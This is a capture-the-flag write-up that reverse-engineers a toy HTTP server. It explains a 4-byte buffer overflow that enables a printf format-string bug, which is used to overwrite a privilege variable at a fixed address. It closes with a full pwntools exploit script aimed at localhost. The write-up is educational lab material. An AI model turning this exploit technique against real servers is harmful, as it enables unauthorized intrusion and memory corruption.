## Getting started

It was immediately noticeable from `main` that this was the implementation of a simple HTTP server. This function creates a socket, binds to `0.0.0.0:1337` listens for and accepts incoming connections and creates a thread passing it the newly created connected-socket in order to service the request. Nothing stood out, except a check for the existence of an environment variable `PRIV_MODE` and the setting of a global variable with the same name, to either 'ON' or 'OFF'.

We then shift our attention to `handle_client`, the entry point of the thread that dispatches the request.

`SO_REUSEADDR` is being used as seen here:

`iVar2 = setsockopt(local_54,1,2,&local_5c,4);`

The `2` in the third argument might be `SO_REUSEADDR`. Albeit, in the end this wasn't helpful. Only a bit of a distraction.
## The `handle_client` function

This function starts by allocating a `2001200` byte buffer, let's call it `first_buffer`. This buffer, more specifically, `first_buffer + 30` (from now on `big_buffer`), is passed as argument to the `init_ctx()` function:

`init_ctx(big_buffer, 0);`

The `init_ctx()` function allocates `16` sub-buffers using the `big_buffer` as base, these buffers are described as follows:

* `0 - f4239; size = 1000000B`: a million bytes allocated to receive data from the socket.
* `f4240 - f424f; size = 16B`: the method in the HTTP request, `GET`, for example.
* `f4250-f42cf; size = 128B`: the received request's path, "/flag.txt" for example.
* `f42d0-f42df; size = 16B`: the protocol, e.g HTTP/1.1
* `f42e0-f435f; size = 128B:` `url_decode` sets this buffer to the URL-decoded path
* `f4360-f4383; size = 36B:` stores the path's file extension
* `f4384-f4683; size = 6*128B:` six contiguous 128B blocks that store the value of the request's headers. In order: Host, User-Agent, Accept, Accept-Language, Accept-Encoding and Connection.
* `f4684-f4693; size = 16B:` stores the response type, e.g 200 OK
* `f4694-1e88d3; size = 1000000B:` stores the HTTP response to be sent using `send()`
* `1e88d4-1e88f3; size = 32B:` stores the MIME type of the response
* `1e88f4-1e88f7; size = 4B:` stores a flag that if != 0, activates multiple debugging conditionals throughout the program

Running `ulimit` on the docker container returns `unlimited` this means threads will have a size of at most, 8MB. This information didn't end up being useful, I just wanted to know.

That last buffer is special, because it stores a debug flag that "unlocks" different zones of the process, blocked by `if(big_buffer[0x1e88f4] != '\0` conditionals. This flag is set to the second argument, which is `0`, preventing debug conditionals from being accesed.

`init_ctx()` allocates those buffers and the subsequent function calls will use them as described in the next sections.
##  `parse_request_line`

Sets first `15` bytes  (+ nullbyte) from `big_buffer + 0xf4240`, the first `127` bytes (+ nullbyte) from `big_buffer + 0xf4250` and the first `15` bytes  (+ nullbyte) from `big_buffer + 0xf42d0` are user controllable. They correspond, respectively, to the method, path and protocol of the HTTP request. Example of a line processed by this function:

`GET /path HTTP/1.1`

## `url_decode`

The `url_decode` function will decode the URL in `big_buffer + 0xf4250` into `big_buffer + 0xf42e0`. It replaces '+' for ' ', and percent-encoded characters to their respective byte representation.
## `cleanup_filepath`

This removes leading '/' from the request's path, and makes sure the path contains no characters other than `_`,`-`, `/`, `.` and alphanumeric symbols, `a-zA-z0-9`. If the path contains something other than this, the final path in `0xf42e0` will be replaced for `index.html`. So it defaults to get you the page index if this function doesn't like one of the characters in your path.

## `get_file_extension`

This sets `big_buffer + 0xf4360` to the extension of the path. The implementation is trivial: it grabs 36 bytes after the first `.` it finds and sets its corresponding buffer to that, for example, if `flag.html/flag.txt` is the path, then `html/flag.txt` is the extension.

## `get_mime_type`

Depending on the extension that get_file_extension returned on big_buffer + 0xf4360, get_mime_type will set `big_buffer + 0x1d88d4` to one of the following MIME types:

* text/html
* text/plain
* application/pdf
* image/jpeg
* image/png

This is done depending on the path's extension. For example, if the extension is `.txt` the MIME type will be set to `text/plain`, and so on.

**The important part is this**: if the extension isn't in the list the server supports, it will load the **WHOLE** extension into the MIME type buffer. The catch is, the MIME type buffer is **only 32** bytes in size, whereas the buffer for the extension is 36 bytes. This is the key exploit to solve this challenge, because it allows for the overflow and rewrite of the `1e88f4` flag that unlocks many debug conditionals, one such conditional allows for the continuation of the exploit, as we'll see.

```c
memcpy((void *)(param_1 + 0x1e88d4),(void *)(param_1 + 0xf4360),0x24); // 0x24 is 4 more bytes than what that buffer has room for!! Overflow!.
```

## `parse_headers`

The `parse_headers` function reads the headers it supports and moves them to the following locations (note: it ONLY moves the header values, not the keys):

| Header Name       | Location in `local_big_buffer` | Offset (from `local_big_buffer`) |
| ----------------- | ------------------------------ | -------------------------------- |
| `Host`            | `local_big_buffer + 0xf4384`   | `0xf4384`                        |
| `User-Agent`      | `local_big_buffer + 0xf4404`   | `0xf4404`                        |
| `Accept`          | `local_big_buffer + 0xf4484`   | `0xf4484`                        |
| `Accept-Language` | `local_big_buffer + 0xf4504`   | `0xf4504`                        |
| `Accept-Encoding` | `local_big_buffer + 0xf4584`   | `0xf4584`                        |
| `Connection`      | `local_big_buffer + 0xf4604`   | `0xf4604`                        |
|                   |                                |                                  |

All those locations are contiguous 128 byte buffers. Anything beyond the 128th byte will be discarded. The important header in this case is the `User-Agent` header. In the code section that handles the `User-Agent` header, we can spot another vulnerability we can leverage to get the flag:
```c
// [...]
  *(undefined8 *)(puVar7 + lVar2 + -8) = 0x401edd;
  iVar4 = strcmp(pcVar1,"User-Agent");
  sVar3 = local_48;
  pcVar1 = local_50;
  pcVar6 = local_88;
  if (iVar4 == 0) {
	pcVar1 = local_big_buffer + 0xf4404;
	*(undefined8 *)(puVar7 + lVar2 + -8) = 0x401f06;
	strncpy(pcVar1,pcVar6,sVar3);
	pcVar6 = local_78;
	if (local_big_buffer[0x1e88f4] != '\0') {
	  pcVar6 = local_big_buffer + 0xf4404;
	  *(undefined8 *)(puVar7 + lVar2 + -8) = 0x401f40;
	  iVar4 = strncmp(pcVar6,"curl",4); // here
	  if (iVar4 == 0) {
		*(undefined8 *)(puVar7 + lVar2 + -8) = 0x401f58;
		printf("Curl Version: ");
		pcVar6 = local_big_buffer + 0xf4404;
		*(undefined8 *)(puVar7 + lVar2 + -8) = 0x401f72;
		printf(pcVar6); // !!!! unsafe usage of the printf function
		pcVar6 = local_78;
	  }
	  else {
		pcVar6 = local_big_buffer + 0xf4404;
		*(undefined8 *)(puVar7 + lVar2 + -8) = 0x401f9b;
		printf("User-Agent: %s\n",pcVar6);
		pcVar6 = local_78
	  }
	//[...]
```

This is a bit hard to read because this is using Ghidra's decompiler, but in summary:

If the header we are currently parsing is `User-Agent`, the first 4 characters of this header are "curl" and more importantly, the `0x1e88f4` flag is NOT null, then the `printf(pcVar6)` line is reachable. This line will literally print the content of the `User-Agent` header, which is user-controlled. Come to this point, we have a buffer overflow that enables a format-string attack, so we'd just need a way to leverage the format-string attack to get the server to send back the flag. How to do this?

## The final stage and a tricky function call

The final bit of code in the request's flow is this:
```c
  cVar2 = extension_is_allowed(big_buffer);
  if (cVar2 == '\x01') {
	*(undefined8 *)(puVar6 + -0x1938) = 0x402c64;
	pcVar5 = strstr("..",big_buffer + 0xf42e0); // holy friggin bait
	if (pcVar5 == (char *)0x0) {
	  *(undefined8 *)(puVar6 + -0x1938) = 0x402c89;
	  build_http_response(big_buffer);
	  goto LAB_00402cab;
	}
  }
```
Something might immediately catch your eye here, yes, in line `pcVar5 = strstr("..",big_buffer + 0xf42e0);` the arguments for `strstr` are inverted. This means that the check for the existence of climb-out path segment `..` inside the final path won't work. Meaning you can send something like this `/index.html/../flag.txt`. That would work, if `index.html` was a file, that is.

I spotted this mistake before I did spot the overflow in `get_mime_type` so I thought that was the way to proceed. It wasn't. It had me fooled for a while before giving up and continuing the search for other possible breaches. Turns out, that mistake in `strstr` isn't even used in the exploitation... Oh well.

## `extension_is_allowed`

Finally, we get to the core of the exploit, remember that `PRIV_MODE` environment variable? I also mentioned that a global variable with the same name was set to either 'ON' or 'OFF' depending on the value of this env variable. Where in the program is this variable and these ON/OFF states referenced? Here:

```c
  local_58 = 2; // set to two, by default...
  local_48[0] = "html";
  local_48[1] = &DAT_0040319b; // htm
  local_48[2] = &DAT_0040319f; // txt
  local_48[3] = &DAT_004031a3; // jpg
  local_28 = &DAT_004031a7; // jpeg (also accessible with local_48[4])
  local_20 = &DAT_004031ac; // png (also accessible with local_48[5])
  local_18 = &DAT_004031b0; // pdf (also accessible with local_48[6])
  iVar1 = strcmp((char *)&PRIV_MODE,"ON"); // <- !!!
  if (iVar1 == 0) { // unless PRIV_MODE is ON
    local_58 = 7; // with this, .txt becomes a valid extension!
  }
  local_50 = 0;
  do {
    if (local_58 <= local_50) {
      uVar2 = 0;
	LAB_00402378:
      return uVar2;
    }
    __n = strlen(local_48[local_50]);
    iVar1 = strncmp((char *)(param_1 + 0xf4360),local_48[local_50],__n);
    if (iVar1 == 0) {
      uVar2 = 1;
      goto LAB_00402378;
    }
    local_50 = local_50 + 1;
  } while( true );
}
```
So what does this loop do? It iterates comparing the request's path extension to the server's supported extensions, html, htm, txt... etc. If there's a match, it returns `1`, if it matches none of them, it returns `0`. We want it to return `1`, given that it is the only way we can access [this conditional](#The-final-stage-and-a-tricky-function-call), so a valid extension has to be provided. In the loop, `local_58` is used as the "limiter" for valid extensions. We can see that there's a few of them, but only the first two (html and htm) will be valid, because `local_58` is set to 2. If it was 3 or greater, txt would also become a valid extension, given `local_48[2]` (txt) would be used in one of the iterations of the loop.

The only way for this to happen is for the `PRIV_MODE` variable to be equal to "ON"... but we do not have access to that variable...

Except we do. Using the format string vulnerability and the fact that this executable is not position-independent, we can write to address `0x405169`, the address of `PRIV_MODE`. Just write two bytes 'O', 'N' and we are done!

In summary, we: 

* Pass an extension big enough so that the extension buffer overflows into the "debug" flag buffer and overwrites it for something other than `0`.
* Change the `User-Agent` header so it contains "curl" + payload.
* Use the payload format string to write "ON" to address `0x405169`, `PRIV_MODE`.
* Send another request, this time with path being a simple "/flag.txt"

This is the payload we can use to do this:

```python
#!/usr/bin/env python3

from pwn import *
import sys

context.clear(arch='amd64') 

# use -exploit and then -flag to first set "ON" and then get the flag
if '-exploit' in sys.argv:
    NUM = 30 # will overflow the buffer to "unlock" the fmtstr vuln
elif '-flag' in sys.argv:
    NUM = 0 # will just ask for "flag.txt"
else:
    print("Usage: script.py [-exploit | -flag]")
    sys.exit(1)

# constants
target_base = 0x405169  # the address for PRIV_MODE
offset = 8              # determined manually with format string probes "%lx"
value = 0x4E4F          # "ON" in hex

# Generate payload
payload = fmtstr_payload(offset, {target_base: value}, numbwritten=4, write_size='short')
# "curl" is 4 bytes, hence numbwritten=4

# build the payload
request = (
    b"GET /flag.txt" + ('a' * NUM).encode() + b" HTTP/1.1\r\n"
    b"Host: TARGET_IP\r\n"
    b"User-Agent: curl" + payload + b"\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

IP = "localhost"
PORT = 1337

try:
    conn = remote(IP, PORT)
    conn.send(request)
    
    response = conn.recvall().decode(errors='ignore')
    print("Server answer:")
    print(response)
    
except Exception as e:
    print(f"Error: {e}")
finally:
    if 'conn' in locals():
        conn.close()
```
We first call it using the `-exploit` flag to get the process to write "ON" to `PRIV_MODE` and then we call it using `-flag` to get the flag, after .txt is now a valid extension :]
